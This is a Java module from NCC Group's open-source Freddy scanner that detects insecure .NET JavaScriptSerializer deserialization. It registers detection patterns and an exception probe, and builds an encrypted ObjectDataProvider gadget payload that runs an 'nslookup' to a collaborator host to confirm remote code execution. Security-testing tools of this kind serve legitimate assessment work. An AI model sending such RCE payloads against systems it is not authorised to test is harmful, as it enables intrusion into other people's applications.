// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the .NET JavascriptSerializer API.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JavascriptSerializerModule extends FreddyModuleBase {
    //ObjectDataProvider payload data
    private final String OBJD_PREFIX = decrypt("0kYvCEfbekqnHbd8ln6AC0frRKpEolbL5zFCRioj3gxsyDuHmCtYD+ArQ6KGox37DtUPP8tn0xCgX24EBf1WPHwhYT8Adj0cse1b+gdkIjKCxrrU8m0dHmD9PoJEPshy/ItnyB6Ox3AP6DCZT3v0k9Wb2WeF0+dttzOYM69Nn1qtLGxpzeBpa6EqHr2cNMXkIkkSyd/gmvTGV3B5HFwe3jZnfk649tMz68G/FHB3Xo8dEednNadv1Q0/WcsOD9RGw0YT8veMi8iqzyvhrexKqOx3sHgPaBBW5rZinvOeNcX814a3nodJehNNd3S7bWV/P4fOMzbQL7lUkDMHK2meZ7wIFLsr/4ChPPxY7yDjKy4TppRFRahpYCjCi0hgmzfY9sUz/CiVXxA4fxVtkq7FFbDSLsImZjek3vajGq62x1Jdtb5u7oINW+NNPITBg6Lh7N4JHCXIvnICxfeyWjFEnq+y3XwcNCeIGohDdOGi8W6CxrrU8m0dHmD9PoJEPshy/ItnyB6Ox3AP6DCZT3v0kyCkiv1jzOLUIC6usXtfpSKe3Ns5dzwRQqkF4UlQXi5FPVoc5yJ5dHGqNKD64Gw3fUTWRIaJkbYIZf7M0Gszu024BsGQGFnUAmKE53T8sCuz");
    private final String OBJD_SUFFIX = decrypt("4dshSQ/daFbXeBxGdVZDYg==");

    protected void initialiseModule() {
        setName("JavascriptSerializer");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("Note that exploitation relies on the target application using an unsafe " +
                "type resolver such as SimpleTypeResolver.");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("((\")|(%22))__type((\")|(%22))"), Pattern.compile("Version"), Pattern.compile("Culture"), Pattern.compile("PublicKeyToken")}, IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("JavaScriptSerializer.Deserialize", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("{\"__type\":\"\"}", "JavaScriptSerializer.Deserialize");

        registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_OBJDATPRO:
                return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;
        }
        return null;
    }
}
